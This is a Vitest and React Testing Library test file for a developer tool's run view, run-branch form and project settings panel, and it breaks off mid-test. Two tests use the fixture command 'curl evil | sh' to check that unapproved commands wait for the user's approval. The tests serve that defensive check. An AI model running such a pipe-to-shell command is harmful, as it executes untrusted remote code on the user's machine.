import { act, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Project } from '../api/gen/Project';
import type { Run } from '../api/gen/Run';
import { toast } from '@ui';
import { githubLinks, renderWithQuery, Reply, stubApi, stubClipboard } from '../test-utils';
import { OpenSessionContext } from '../common/open';
import { ProjectSettingsPanel } from './ProjectSettingsPanel';
import { RunBranchForm } from './RunBranchForm';
import { RunView } from './RunView';

vi.mock('../files/CodeViewer', () => ({ CodeViewer: ({ text }: { text: string }) => <pre data-testid="code">{text}</pre> }));
vi.mock('../terminal/TerminalView', () => ({
  TerminalView: ({ url, sessionStatus }: { url?: string; sessionStatus?: string }) => (
    <div data-testid="terminal-view" data-status={sessionStatus}>{url}</div>
  ),
}));

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  act(() => { toast.dismiss(); });
});

/** Picks an entry of the run's ⋯ menu. */
async function runMenu(item: string) {
  await userEvent.click(within(screen.getByRole('banner')).getByRole('button', { name: 'Run actions' }));
  const menu = await screen.findByRole('menu', { name: 'Run actions' });
  await userEvent.click(within(menu).getByRole('menuitem', { name: item }));
}

const project: Project = { id: 'p', name: 'PDT', repoPath: '/r', baseBranch: 'main', createdAt: 1, key: 'PDT', forge: null, kind: 'repo' };
const run = (over: Partial<Run>): Run => ({
  id: 'r1', projectId: 'p', worktreeId: null, branch: 'main', name: 'web', kind: 'run', state: 'ready',
  port: 8401, url: 'https://box.t.ts.net:8401/', dataDir: '/d', cwd: '/r', exitCode: null, error: null, detached: false,
  createdAt: 1, updatedAt: 1, ...over,
});
const config = {
  filePath: '/r/.pdt/project.toml', file: '', overrides: null, error: null,
  effective: {
    runs: [{ name: 'web', setup: null, command: 'x', web: true, data: true, env: {} }],
    tests: [{ name: 'unit', setup: null, command: 'y', web: false, data: false, env: {} }],
  },
};

/** Opens a Select and picks the option with this label. */
async function choose(trigger: HTMLElement, option: string) {
  await userEvent.click(trigger);
  await userEvent.click(within(screen.getByRole('listbox')).getByRole('option', { name: option }));
}

/** Answers the confirm dialog that is open with its named action. */
async function confirmWith(action: string) {
  const dialog = await screen.findByRole('alertdialog');
  await userEvent.click(within(dialog).getByRole('button', { name: action }));
  await waitFor(() => expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument());
}

describe('RunBranchForm', () => {
  it('runs a branch that has no worktree yet', async () => {
    const calls = stubApi({
      'GET /api/projects/p/branches': [{ name: 'main', local: true }, { name: 'feature/y', local: false }],
      'GET /api/projects/p/run-config': config,
      'POST /api/projects/p/runs': (c) => run({ id: 'n', ...(c.body as object) }),
    });
    const onSelectRun = vi.fn();
    renderWithQuery(<RunBranchForm project={project} onSelectRun={onSelectRun} />);
    await choose(await screen.findByRole('button', { name: /^Branch/ }), 'feature/y (origin)');
    await choose(screen.getByRole('button', { name: /What to run/ }), 'web');
    await userEvent.click(screen.getByRole('button', { name: 'Run branch' }));
    await waitFor(() => expect(onSelectRun).toHaveBeenCalledWith('n'));
    expect(calls.find((c) => c.method === 'POST')?.body).toEqual({ branch: 'feature/y', name: 'web', kind: 'run' });
  });
});

describe('RunView', () => {
  it('shows the run in the header: dot, name, branch chip, state, Stop and Restart', async () => {
    stubApi({ 'GET /api/projects': [{ ...project, forge: githubLinks('o/r'), kind: 'repo' }] });
    const { rerender } = renderWithQuery(<RunView run={run({ branch: 'feature/x' })} onRemoved={() => {}} />);
    const h = screen.getByRole('banner');
    expect(within(h).getByRole('heading', { name: 'web' })).toHaveAttribute('title', 'web · feature/x');
    expect(await within(h).findByRole('button', { name: 'Branch feature/x' })).toBeInTheDocument();
    expect(within(h).getByText('ready')).toBeInTheDocument();
    expect(within(h).getByRole('button', { name: 'Stop' })).toBeInTheDocument();
    expect(within(h).getByRole('button', { name: 'Restart' })).toBeInTheDocument();
    rerender(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    expect(within(screen.getByRole('banner')).queryByRole('button', { name: 'Stop' })).not.toBeInTheDocument();
    expect(within(screen.getByRole('banner')).getByRole('button', { name: 'Restart' })).toBeInTheDocument();
  });

  it("has a one-line header with the run's state on a phone, Stop and Restart under ⋯", async () => {
    vi.stubGlobal('matchMedia', (query: string) => ({ matches: query.includes('max-width'), media: query, addEventListener: () => {}, removeEventListener: () => {} }));
    const calls = stubApi({ 'GET /api/projects': [project], 'POST /api/runs/r1/stop': undefined });
    renderWithQuery(<RunView run={run({ branch: 'feature/x' })} onRemoved={() => {}} />);
    const h = screen.getByRole('banner', { name: 'Run' });
    expect(within(h).getByText('ready')).toBeInTheDocument();
    expect(within(h).getByRole('heading', { name: 'web' })).toBeInTheDocument();
    expect(within(h).queryByRole('button', { name: 'Stop' })).not.toBeInTheDocument();
    await userEvent.click(within(h).getByRole('button', { name: 'Run actions' }));
    const menu = await screen.findByRole('menu', { name: 'Run actions' });
    expect(within(menu).getAllByRole('menuitem').map((m) => m.textContent)).toEqual(expect.arrayContaining(['Stop', 'Restart']));
    await userEvent.click(within(menu).getByRole('menuitem', { name: 'Stop' }));
    await waitFor(() => expect(calls.some((c) => c.method === 'POST' && c.path === '/api/runs/r1/stop')).toBe(true));
    // The log is still below the header.
    expect(screen.getByTestId('terminal-view')).toBeInTheDocument();
  });

  it('says a detached run keeps running when PDT restarts, on its Output only', async () => {
    stubApi({});
    renderWithQuery(<RunView run={run({ detached: true })} onRemoved={() => {}} />);
    expect(screen.getByText(/Detached: keeps running when PDT restarts/)).toBeInTheDocument();
    await userEvent.click(screen.getByRole('radio', { name: 'Setup' }));
    expect(screen.queryByText(/Detached: keeps running/)).not.toBeInTheDocument();
  });

  it('copies the URL from its menu', async () => {
    stubApi({});
    const writeText = vi.fn(async () => {});
    stubClipboard({ writeText });
    renderWithQuery(<RunView run={run({})} onRemoved={() => {}} />);
    await runMenu('Copy URL');
    expect(writeText).toHaveBeenCalledWith('https://box.t.ts.net:8401/');
    expect(await screen.findByText('URL copied')).toBeInTheDocument();
  });

  it('links a ready web run and stops it', async () => {
    const calls = stubApi({ 'POST /api/runs/r1/stop': undefined, 'GET /api/projects/p/runs': [] });
    renderWithQuery(<RunView run={run({})} onRemoved={() => {}} />);
    expect(screen.getByRole('link', { name: 'https://box.t.ts.net:8401/' })).toHaveAttribute('target', '_blank');
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/api/runs/r1/pty/command');
    await userEvent.click(screen.getByRole('radio', { name: 'Setup' }));
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/api/runs/r1/pty/setup');
    await userEvent.click(screen.getByRole('button', { name: 'Stop' }));
    await waitFor(() => expect(calls.some((c) => c.path === '/api/runs/r1/stop')).toBe(true));
  });

  it('shows why a run failed and offers restart, reset data and remove', async () => {
    const calls = stubApi({
      'POST /api/runs/r1/restart': run({}),
      'POST /api/runs/r1/reset-data': undefined,
      'DELETE /api/runs/r1': undefined,
      'GET /api/projects/p/runs': [],
    });
    const onRemoved = vi.fn();
    renderWithQuery(<RunView run={run({ state: 'failed', error: 'setup exited with code 3', exitCode: 3 })} onRemoved={onRemoved} />);
    expect(screen.getByRole('alert')).toHaveTextContent('setup exited with code 3');
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
    await runMenu('Reset data…');
    await confirmWith('Reset data');
    await waitFor(() => expect(calls.some((c) => c.path === '/api/runs/r1/reset-data')).toBe(true));
    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
    await waitFor(() => expect(calls.some((c) => c.path === '/api/runs/r1/restart')).toBe(true));
    await runMenu('Remove…');
    await confirmWith('Remove run');
    await waitFor(() => expect(onRemoved).toHaveBeenCalled());
    expect(calls.map((c) => `${c.method} ${c.path}`)).toEqual(
      expect.arrayContaining(['POST /api/runs/r1/reset-data', 'POST /api/runs/r1/restart', 'DELETE /api/runs/r1']),
    );
  });

  it('asks before stopping the oldest run when a restart hits the host limit', async () => {
    let posts = 0;
    const calls = stubApi({
      'GET /api/runs': [run({ id: 'oldest', name: 'api', branch: 'b1' })],
      'GET /api/projects/p/runs': [],
      'POST /api/runs/r1/restart': () =>
        ++posts === 1 ? new Reply(409, { code: 'too_many_runs', message: 'Stop "api · b1" to start this one?' }) : run({}),
    });
    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
    expect(await screen.findByRole('alertdialog', { name: 'Stop "api · b1" to start this one?' })).toBeInTheDocument();
    await confirmWith('Stop it and start');
    await waitFor(() => expect(calls.filter((c) => c.path === '/api/runs/r1/restart')).toHaveLength(2));
    expect(calls.filter((c) => c.path === '/api/runs/r1/restart').map((c) => c.body)).toEqual([{}, { stopRunId: 'oldest' }]);
  });

  it('shows a command PDT has not run before, and approves it as the user before running', async () => {
    let posts = 0;
    const command = { fingerprint: 'f1', uses: ['run "web"'], setup: 'pnpm i', command: 'pnpm dev', env: { PORT: '1' } };
    const calls = stubApi({
      'GET /api/projects/p/runs': [],
      'POST /api/projects/p/commands/trust': undefined,
      'POST /api/runs/r1/restart': () =>
        ++posts === 1
          ? new Reply(409, { code: 'untrusted_commands', message: 'PDT hasn\'t run this command', data: { projectId: 'p', commands: [command] } })
          : run({}),
    });
    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
    const dialog = await screen.findByRole('alertdialog', { name: 'Run this command?' });
    expect(within(dialog).getByRole('group', { name: 'Command for run "web"' })).toHaveTextContent('pnpm i PORT=1 pnpm dev');
    await confirmWith('Approve and run');
    await waitFor(() => expect(calls.filter((c) => c.path === '/api/runs/r1/restart')).toHaveLength(2));
    expect(calls.find((c) => c.path === '/api/projects/p/commands/trust')?.body).toEqual({ fingerprints: ['f1'] });
  });

  it('runs nothing when the user does not approve the command', async () => {
    const command = { fingerprint: 'f1', uses: ['run "web"'], setup: null, command: 'curl evil | sh', env: {} };
    const calls = stubApi({
      'GET /api/projects/p/runs': [],
      'POST /api/runs/r1/restart': new Reply(409, { code: 'untrusted_commands', message: 'no', data: { projectId: 'p', commands: [command] } }),
    });
    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    await userEvent.click(screen.getByRole('button', { name: 'Restart' }));
    expect(await screen.findByRole('alertdialog', { name: 'Run this command?' })).toHaveTextContent('curl evil | sh');
    await confirmWith('Cancel');
    expect(calls.filter((c) => c.method === 'POST').map((c) => c.path)).toEqual(['/api/runs/r1/restart']);
  });

  it('asks before resetting data or removing, and does nothing when cancelled', async () => {
    const calls = stubApi({ 'GET /api/projects/p/runs': [] });
    const onRemoved = vi.fn();
    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={onRemoved} />);
    await runMenu('Reset data…');
    const reset = await screen.findByRole('alertdialog', { name: 'Reset the data of web?' });
    expect(reset).toHaveTextContent('(/d)');
    await confirmWith('Cancel');
    await runMenu('Remove…');
    expect(await screen.findByRole('alertdialog', { name: 'Remove web · main?' })).toHaveTextContent(/data folder and the checkout stay/);
    await confirmWith('Cancel');
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);
    expect(onRemoved).not.toHaveBeenCalled();
  });

  it('toasts a failed reset', async () => {
    stubApi({ 'GET /api/projects/p/runs': [], 'POST /api/runs/r1/reset-data': new Reply(500, { code: 'internal', message: 'permission denied' }) });
    renderWithQuery(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    await runMenu('Reset data…');
    await confirmWith('Reset data');
    expect(await screen.findByText('permission denied')).toBeInTheDocument();
  });

  it('follows the run state with its tab, and marks a finished step finished', async () => {
    const { rerender } = renderWithQuery(<RunView run={run({ state: 'setting_up' })} onRemoved={() => {}} />);
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/pty/setup');
    expect(screen.getByTestId('terminal-view')).toHaveAttribute('data-status', 'running');
    rerender(<RunView run={run({ state: 'ready' })} onRemoved={() => {}} />);
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/pty/command');
    expect(screen.getByTestId('terminal-view')).toHaveAttribute('data-status', 'running');
    await userEvent.click(screen.getByRole('radio', { name: 'Setup' }));
    expect(screen.getByTestId('terminal-view')).toHaveAttribute('data-status', 'finished');
    rerender(<RunView run={run({ state: 'stopped' })} onRemoved={() => {}} />);
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/pty/command');
    expect(screen.getByTestId('terminal-view')).toHaveAttribute('data-status', 'finished');
  });

  it('starts clean for another run when keyed by run id', async () => {
    stubApi({ 'GET /api/projects/p/runs': [], 'POST /api/runs/r1/stop': new Reply(409, { code: 'run_stopping', message: 'still stopping' }) });
    const { rerender } = renderWithQuery(<RunView key="r1" run={run({})} onRemoved={() => {}} />);
    await userEvent.click(screen.getByRole('radio', { name: 'Setup' }));
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/api/runs/r1/pty/setup');
    rerender(<RunView key="r2" run={run({ id: 'r2' })} onRemoved={() => {}} />);
    expect(screen.getByTestId('terminal-view')).toHaveTextContent('/api/runs/r2/pty/command');
  });

  it('shows a stop that timed out so the user can retry', async () => {
    stubApi({
      'GET /api/projects/p/runs': [],
      'POST /api/runs/r1/stop': new Reply(409, { code: 'run_stopping', message: 'the run has not stopped yet; try again in a moment' }),
    });
    renderWithQuery(<RunView run={run({})} onRemoved={() => {}} />);
    await userEvent.click(screen.getByRole('button', { name: 'Stop' }));
    expect(await screen.findByText(/has not stopped yet/)).toBeInTheDocument();
    await waitFor(() => expect(screen.getByRole('button', { name: 'Stop' })).toBeEnabled());
  });
});

describe('ProjectSettingsPanel', () => {
  it('notes sections of the file that this version skipped', async () => {
    stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null },
      'GET /api/projects/p/run-config': { ...config, effective: { ...config.effective, areas: [], ignored: ['pipeline', 'gate'] } },
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    expect(await screen.findByText('Skipped [pipeline], [gate]: this version does not know those sections.')).toBeInTheDocument();
  });

  it('shows where the local forge pushes its merges', async () => {
    const local = (push: unknown) => ({ ...config, effective: { ...config.effective, areas: [], ignored: [], forge: 'local', push } });
    stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null },
      'GET /api/projects/p/run-config': local({ remote: 'origin', branches: true }),
    });
    const { unmount } = renderWithQuery(<ProjectSettingsPanel project={project} />);
    expect(await screen.findByText('origin')).toBeInTheDocument();
    expect(screen.getByText(/pushes the base to this remote.*Ticket branches are pushed too/)).toBeInTheDocument();
    unmount();
    stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null },
      'GET /api/projects/p/run-config': local(null),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    expect(await screen.findByText(/Pushes nowhere/)).toBeInTheDocument();
  });

  it('saves run overrides with their own Save and shows validation errors', async () => {
    let attempt = 0;
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: 'pass_through', effectiveCredentials: 'pass_through', runOverrides: null, agentInstructions: 'Use make.' },
      'GET /api/projects/p/run-config': { ...config, file: '[[run]]\nname = "web"\n' },
      'GET /api/projects/p/commands': { commands: [], untrusted: [], error: null },
      'PUT /api/projects/p/settings': (c) =>
        ++attempt === 1
          ? new Reply(400, { code: 'invalid_run_config', message: 'the host overrides is not valid: x' })
          : { agentCredentials: 'pass_through', effectiveCredentials: 'pass_through', runOverrides: (c.body as { runOverrides: string }).runOverrides, agentInstructions: 'Use make.' },
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    expect(await screen.findByTestId('code')).toHaveTextContent('name = "web"');
    expect(screen.queryByText(/Skipped/)).not.toBeInTheDocument();
    const runs = screen.getByRole('region', { name: 'Runs on this host' });
    const save = within(runs).getByRole('button', { name: 'Save run overrides' });
    await waitFor(() => expect(save).toBeDisabled());
    await userEvent.type(within(runs).getByRole('textbox', { name: 'Host overrides (TOML)' }), 'bad');
    await userEvent.click(save);
    expect(await within(runs).findByRole('alert')).toHaveTextContent('not valid');
    await userEvent.click(save);
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(2));
    // The other sections' stored values go along unchanged; the instructions are left out (kept).
    expect(calls.filter((c) => c.method === 'PUT')[1].body).toEqual({ agentCredentials: 'pass_through', runOverrides: 'bad' });
    expect(await within(runs).findByRole('status')).toHaveTextContent('Saved');
  });

  it('lists the commands PDT runs, the unapproved first, each with Approve', async () => {
    const ok = { fingerprint: 'ok', uses: ['test "rust"', 'CI'], setup: null, command: 'cargo test', env: {} };
    const evil = { fingerprint: 'evil', uses: ['regenerating Cargo.lock'], setup: null, command: 'curl evil | sh', env: {} };
    let approved = false;
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null },
      'GET /api/projects/p/run-config': config,
      'GET /api/projects/p/commands': () => ({ commands: [ok, evil], untrusted: approved ? [] : ['evil'], error: null }),
      'POST /api/projects/p/commands/trust': () => { approved = true; },
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const commands = await screen.findByRole('group', { name: 'Commands' });
    const cards = await within(commands).findAllByRole('group', { name: /^Command for/ });
    expect(cards.map((c) => c.getAttribute('aria-label'))).toEqual(['Command for regenerating Cargo.lock', 'Command for test "rust", CI']);
    expect(cards[0]).toHaveTextContent('Not approved');
    expect(cards[1]).toHaveTextContent('Approved');
    await userEvent.click(within(cards[0]).getByRole('button', { name: 'Approve' }));
    await waitFor(() => expect(within(commands).queryByText('Not approved')).not.toBeInTheDocument());
    expect(calls.find((c) => c.path === '/api/projects/p/commands/trust')?.body).toEqual({ fingerprints: ['evil'] });
    expect(calls.some((c) => c.method === 'PUT')).toBe(false);
  });

  it('saves merging through pull requests as soon as it is switched', async () => {
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, mergeViaPr: false },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({ effectiveCredentials: 'subscription', agentInstructions: null, mergeViaPr: false, ...(c.body as object) }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const toggle = await screen.findByRole('switch', { name: 'Merge through pull requests' });
    await waitFor(() => expect(toggle).toBeEnabled());
    await userEvent.click(toggle);
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, mergeViaPr: true });
    await waitFor(() => expect(toggle).toBeChecked());
  });

  it('saves the labels that merge without approval once typed', async () => {
    const policy = { mergeBy: 'agents', requireApproval: true, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'off' };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null,
        policy: { ...policy, approvalExemptLabels: (c.body as { approvalExemptLabels: string[] }).approvalExemptLabels },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const box = await screen.findByRole('textbox', { name: 'Labels that merge without approval' });
    await waitFor(() => expect(box).toBeEnabled());
    await userEvent.type(box, 'automerge, docs{Enter}');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, approvalExemptLabels: ['automerge', 'docs'] });
    await waitFor(() => expect(box).toHaveValue('automerge, docs'));
    // Leaving the field unchanged saves nothing more.
    await userEvent.click(document.body);
    expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1);
  });

  it('turns off waiting for green CI before an automated merge (on by default)', async () => {
    const policy = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'off', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120, requireGreenCi: true };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const toggle = await screen.findByRole('switch', { name: 'An automated merge waits for green CI' });
    await waitFor(() => expect(toggle).toBeEnabled());
    expect(toggle).toBeChecked();
    await userEvent.click(toggle);
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, requireGreenCi: false });
    await waitFor(() => expect(toggle).not.toBeChecked());
  });

  it('lets tickets without areas wait beside hot areas, shown once the project has hot areas (PDT-329)', async () => {
    const base = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'todo', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120, requireGreenCi: true, untaggedAlongsideHot: true };
    for (const hotAreas of [[], ['api']]) {
      const policy = { ...base, hotAreas };
      const calls = stubApi({
        'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
        'GET /api/projects/p/run-config': config,
        'GET /api/projects/p/areas': { areas: [{ name: 'api', paths: ['api/**'], exclusive: false }], error: null },
        'PUT /api/projects/p/settings': (c) => ({
          effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
        }),
      });
      const { unmount } = renderWithQuery(<ProjectSettingsPanel project={project} />);
      await screen.findByText('Hot areas');
      const name = 'Tickets without areas run alongside hot ones';
      if (hotAreas.length === 0) {
        expect(screen.queryByRole('switch', { name })).not.toBeInTheDocument();
      } else {
        const toggle = await screen.findByRole('switch', { name });
        await waitFor(() => expect(toggle).toBeEnabled());
        expect(toggle).toBeChecked();
        await userEvent.click(toggle);
        await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
        expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, untaggedAlongsideHot: false });
      }
      unmount();
    }
  });

  it('turns off waiting in the Inbox for triaged tickets (on by default, PDT-225)', async () => {
    const policy = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'off', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120, requireGreenCi: true, triageApproval: 'inbox' };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const select = await screen.findByRole('button', { name: /Triaged tickets/ });
    expect(select).toHaveTextContent('Wait in the Inbox');
    await choose(select, 'Off: stay in the backlog');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, triageApproval: 'off' });
  });

  it('resolves conflicts at merge time by default, or immediately (PDT-328)', async () => {
    const policy = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'off', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120, requireGreenCi: true, triageApproval: 'inbox', resolveConflicts: 'merge_time', hotAreas: [], untaggedAlongsideHot: true };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const select = await screen.findByRole('button', { name: /When to resolve conflicts/ });
    expect(select).toHaveTextContent('At merge time');
    await choose(select, 'Immediately');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, resolveConflicts: 'immediately' });
  });

  it('saves the quiet period before auto-start, shown while auto-start is on', async () => {
    const policy = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'todo', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120 };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const select = await screen.findByRole('button', { name: /Quiet period before auto-start/ });
    expect(select).toHaveTextContent('2 minutes');
    await choose(select, 'None: at once');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, startDelaySeconds: 0 });
  });

  it('saves what auto-start picks by, shown while auto-start is on', async () => {
    const policy = { mergeBy: 'agents', requireApproval: false, approvalExemptLabels: [], maxRunningAttempts: null, autoStart: 'todo', autoStartOrder: 'priority', pmActs: false, startDelaySeconds: 120 };
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null, policy },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({
        effectiveCredentials: 'subscription', agentInstructions: null, policy: { ...policy, ...(c.body as object) },
      }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const select = await screen.findByRole('button', { name: /Auto-start picks by/ });
    expect(select).toHaveTextContent('Priority, then rank');
    await choose(select, 'Backlog rank');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, autoStartOrder: 'rank' });
  });

  it('saves the credential policy as soon as it is chosen, keeping unsaved overrides on screen', async () => {
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: 'x = 1', agentInstructions: null },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({ effectiveCredentials: 'pass_through', agentInstructions: null, ...(c.body as object) }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const box = screen.getByRole('textbox', { name: 'Host overrides (TOML)' });
    await waitFor(() => expect(box).toHaveValue('x = 1'));
    await userEvent.type(box, ' # draft');
    await choose(screen.getByRole('button', { name: /Agent credentials/ }), 'Pass through');
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: 'pass_through', runOverrides: 'x = 1' });
    expect(await within(screen.getByRole('region', { name: 'Agents' })).findByRole('status')).toHaveTextContent('Saved');
    expect(box).toHaveValue('x = 1 # draft');
  });

  it('saves the agent instructions', async () => {
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: 'Use make.' },
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => ({ agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, ...(c.body as object) }),
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    const box = screen.getByRole('textbox', { name: 'Agent instructions' });
    await waitFor(() => expect(box).toHaveValue('Use make.'));
    await userEvent.type(box, ' Then test.');
    // Saved when the field is left: no Save button.
    expect(screen.queryByRole('button', { name: 'Save agent instructions' })).toBeNull();
    await userEvent.tab();
    await waitFor(() => expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(1));
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({ agentCredentials: null, runOverrides: null, agentInstructions: 'Use make. Then test.' });
  });

  it('keeps the forms read-only and PUTs nothing while the settings have not loaded', async () => {
    const calls = stubApi({
      'GET /api/projects/p/settings': new Reply(503, { code: 'unavailable', message: 'restarting' }),
      'GET /api/projects/p/run-config': config,
      'PUT /api/projects/p/settings': (c) => c.body,
    });
    renderWithQuery(<ProjectSettingsPanel project={project} />);
    expect(await screen.findByText(/Project settings could not be loaded/)).toBeInTheDocument();
    expect(screen.getByRole('textbox', { name: 'Agent instructions' })).toBeDisabled();
    expect(screen.getByRole('textbox', { name: 'Host overrides (TOML)' })).toBeDisabled();
    expect(calls.filter((c) => c.method === 'PUT')).toHaveLength(0);
  });

  it('starts an agent session in the main checkout with a built-in set-up prompt', async () => {
    const calls = stubApi({
      'GET /api/projects/p/settings': { agentCredentials: null, effectiveCredentials: 'subscription', runOverrides: null, agentInstructions: null },
      'GET /api/projects/p/run-config': config,
      'GET /api/guides/set-up-project': () => new Response('Set up this project so PDT can run it.', { status: 200 }),
      'GET /api/guides/set-up-workflow': () => new Response('Help me write the agent instructions.', { status: 200 }),
      'POST /api/sessions': { id: 's1', projectId: 'p' },
    });
    const opened: string[] = [];
    renderWithQuery(
      <OpenSessionContext.Provider value={(s) => opened.push(s.id)}>
